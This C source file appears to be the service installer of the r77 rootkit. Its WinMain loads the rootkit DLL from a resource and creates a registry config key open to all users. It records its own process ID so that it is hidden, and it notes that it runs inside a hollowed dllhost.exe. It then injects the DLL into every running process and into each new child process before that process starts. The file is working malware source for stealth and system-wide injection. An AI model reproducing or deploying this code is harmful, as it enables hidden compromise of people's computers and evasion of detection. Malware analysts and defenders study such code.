#include "InstallService.h"

int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
{
	InitializeApi(INITIALIZE_API_SRAND | INITIALIZE_API_DEBUG_PRIVILEGE);

	// Get r77 DLL.
	if (!GetResource(IDR_R77, "DLL", &Dll, &DllSize)) return 0;

	// Terminate already running r77 service processes of the same bitness as the current process.
	TerminateR77Service(GetCurrentProcessId());

	// Create HKEY_LOCAL_MACHINE\SOFTWARE\$77config and set DACL to allow full access by any user.
	HKEY configKey;
	if (InstallR77Config(&configKey))
	{
		// Write current process ID to the list of hidden PID's.
		// Since this process is created using process hollowing (dllhost.exe), the name cannot begin with "$77".
		// Therefore, process hiding by PID must be used.
		HKEY pidKey;
		if (RegCreateKeyExW(configKey, L"pid", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &pidKey, NULL) == ERROR_SUCCESS)
		{
			// The registry values "svc32" and "svc64" are reserved for the r77 service.
			DWORD processId = GetCurrentProcessId();
			RegSetValueExW(pidKey, sizeof(LPVOID) == 4 ? L"svc32" : L"svc64", 0, REG_DWORD, (LPBYTE)&processId, sizeof(DWORD));
			RegCloseKey(pidKey);
		}

		RegCloseKey(configKey);
	}

	// When the NtResumeThread hook is called, the r77 service is notified through a named pipe connection.
	// This will trigger the following callback and the child process is injected.
	// After it's injected, NtResumeThread is executed in the parent process.
	// This way, r77 is injected before the first instruction is run in the child process.
	ChildProcessListener(ChildProcessCallback);

	// In addition, check for new processes every 100 ms that might have been missed by child process hooking.
	// This is particularly the case for child processes of protected processes (such as services.exe), because protected processes cannot be injected.
	// In the first iteration, the callback is invoked for every currently running process, making this the initial injection into all processes.
	NewProcessListener(100, NewProcessCallback);

	// There are no implications when injecting a process twice.
	// If the R77_SIGNATURE is already present in the target process, the r77 DLL will just unload itself.

	while (true)
	{
		Sleep(100);
	}

	return 0;
}
VOID ChildProcessCallback(DWORD processId)
{
	// Hook the newly created child processes before it is actually started.
	// After this function returns, the original NtResumeThread is called.
	InjectDll(processId, Dll, DllSize, FALSE);
}
VOID NewProcessCallback(DWORD processId)
{
	// Hook new processes that might have been missed by child process hooking.
	InjectDll(processId, Dll, DllSize, TRUE);
}